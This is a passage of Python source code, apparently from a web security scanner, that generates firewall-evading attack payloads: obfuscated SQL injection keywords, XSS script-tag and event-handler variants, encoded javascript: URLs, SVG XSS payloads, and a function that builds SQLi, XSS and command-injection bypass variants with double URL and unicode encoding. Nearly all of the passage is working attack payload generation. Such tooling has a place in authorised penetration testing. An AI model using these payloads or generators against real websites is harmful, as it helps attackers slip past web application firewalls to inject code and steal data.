            'OR': [
                'OR', 'oR', '||', '/*!50000OR*/',
                '%4FR', 'O%52', 'O/**/R'
            ],
            'ORDER BY': [
                'ORDER BY', 'ORDER/**/BY', 'ORDER%0ABY',
                '/*!50000ORDER*//**/BY', 'OrDeR%20bY'
            ]
        }

    @staticmethod
    def generate_bypass_payloads(base_payload: str) -> List[str]:
        """Generate multiple bypass variants for a SQLi payload"""
        variants = []

        # Original
        variants.append(base_payload)

        # Comment obfuscation
        variants.extend(SQLiWAFBypass.comment_variations(base_payload)[:3])

        # Case variation
        variants.append(PayloadTamper.randomcase(base_payload))

        # Version comments
        variants.append(PayloadTamper.versionedkeywords(base_payload))

        # Unicode normalization
        variants.extend(AdvancedEncodingBypass.unicode_normalization_bypass(base_payload)[:2])

        # URL encoding
        variants.append(quote(base_payload))
        variants.append(AdvancedEncodingBypass.double_url_encode(base_payload))

        return variants[:15]


class XSSWAFBypass:
    """
    XSS specific WAF bypass techniques for modern WAFs.
    """

    @staticmethod
    def tag_obfuscation() -> List[str]:
        """Obfuscated script tag variants"""
        return [
            '<script>',
            '<ScRiPt>',
            '<script >',
            '<script\t>',
            '<script\n>',
            '<script/x>',
            '<script/src=>',
            '<%00script>',
            '<\x00script>',
            '<scr<script>ipt>',
            '<scr\x00ipt>',
            '<script/random>',
        ]

    @staticmethod
    def event_handler_bypass() -> List[str]:
        """Event handlers that may bypass filters"""
        return [
            'onerror',
            'onload',
            'onfocus',
            'onmouseover',
            'onanimationend',
            'ontransitionend',
            'onpointerover',
            'ontouchstart',
            'onbeforeinput',
            'oncontextmenu',
            'ondrag',
            'ondragend',
            'ondragenter',
            'ondragleave',
            'ondragover',
            'ondragstart',
            'ondrop',
            'onauxclick',
            'onbeforecopy',
            'onbeforecut',
            'onbeforepaste',
            'onwebkitanimationend',
            'onwebkitanimationiteration',
            'onwebkitanimationstart',
            'onwebkittransitionend',
        ]

    @staticmethod
    def javascript_protocol_bypass() -> List[str]:
        """JavaScript protocol obfuscation"""
        return [
            'javascript:',
            'Javascript:',
            'JAVASCRIPT:',
            'jAvAsCrIpT:',
            'java\tscript:',
            'java\nscript:',
            'java\rscript:',
            '&#106;avascript:',
            '&#x6A;avascript:',
            'javascript&#58;',
            'javascript&#x3A;',
            'java&#x09;script:',
            'java&#x0A;script:',
            'java&#x0D;script:',
        ]

    @staticmethod
    def svg_bypass_payloads() -> List[str]:
        """SVG-based XSS that may bypass filters"""
        return [
            '<svg onload=alert(1)>',
            '<svg/onload=alert(1)>',
            '<svg	onload=alert(1)>',  # Tab
            '<svg\nonload=alert(1)>',  # Newline
            '<svg/x=">"/onload=alert(1)>',
            '<svg><script>alert(1)</script>',
            '<svg><animate onbegin=alert(1)>',
            '<svg><set onbegin=alert(1)>',
            '<svg><handler onclick=alert(1)>',
            '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a>',
        ]

    @staticmethod
    def generate_bypass_payloads(script: str = 'alert(1)') -> List[str]:
        """Generate XSS bypass variants"""
        variants = []

        # Basic event handlers
        for handler in XSSWAFBypass.event_handler_bypass()[:10]:
            variants.append(f'<img src=x {handler}={script}>')
            variants.append(f'<svg/{handler}={script}>')

        # SVG payloads
        variants.extend(XSSWAFBypass.svg_bypass_payloads()[:5])

        # JavaScript protocol
        for proto in XSSWAFBypass.javascript_protocol_bypass()[:3]:
            variants.append(f'<a href="{proto}{script}">')

        # Unicode normalization
        base = f'<img src=x onerror={script}>'
        variants.extend(AdvancedEncodingBypass.unicode_normalization_bypass(base)[:3])

        return variants[:30]


# Convenience function to apply all bypass techniques
def generate_waf_bypass_variants(payload: str, vuln_type: str = 'sqli', max_variants: int = 20) -> List[Dict]:
    """
    Generate multiple WAF bypass variants for a payload.

    Args:
        payload: Original payload
        vuln_type: Type of vulnerability ('sqli', 'xss', 'cmdi', 'generic')
        max_variants: Maximum number of variants to generate

    Returns:
        List of dicts with 'payload', 'technique', 'encoded'
    """
    variants = []

    # Always include original
    variants.append({
        'payload': payload,
        'technique': 'original',
        'encoded': quote(payload, safe='')
    })

    if vuln_type == 'sqli':
        for p in SQLiWAFBypass.generate_bypass_payloads(payload):
            variants.append({
                'payload': p,
                'technique': 'sqli_bypass',
                'encoded': quote(p, safe='')
            })

    elif vuln_type == 'xss':
        for p in XSSWAFBypass.generate_bypass_payloads():
            variants.append({
                'payload': p,
                'technique': 'xss_bypass',
                'encoded': quote(p, safe='')
            })

    elif vuln_type == 'cmdi':
        for p in CMDiTamper.generate_variants(payload):
            variants.append({
                'payload': p,
                'technique': 'cmdi_bypass',
                'encoded': quote(p, safe='')
            })

    # Add generic encoding bypasses for all types
    variants.append({
        'payload': AdvancedEncodingBypass.double_url_encode(payload),
        'technique': 'double_encode',
        'encoded': AdvancedEncodingBypass.double_url_encode(payload)
    })

    variants.append({
        'payload': AdvancedEncodingBypass.mixed_encoding(payload),
        'technique': 'mixed_encoding',
        'encoded': AdvancedEncodingBypass.mixed_encoding(payload)
    })

    # JSON unicode for API testing
    variants.append({
        'payload': AdvancedEncodingBypass.json_unicode_escape(payload),
        'technique': 'json_unicode',
        'encoded': AdvancedEncodingBypass.json_unicode_escape(payload)
    })

    return variants[:max_variants]
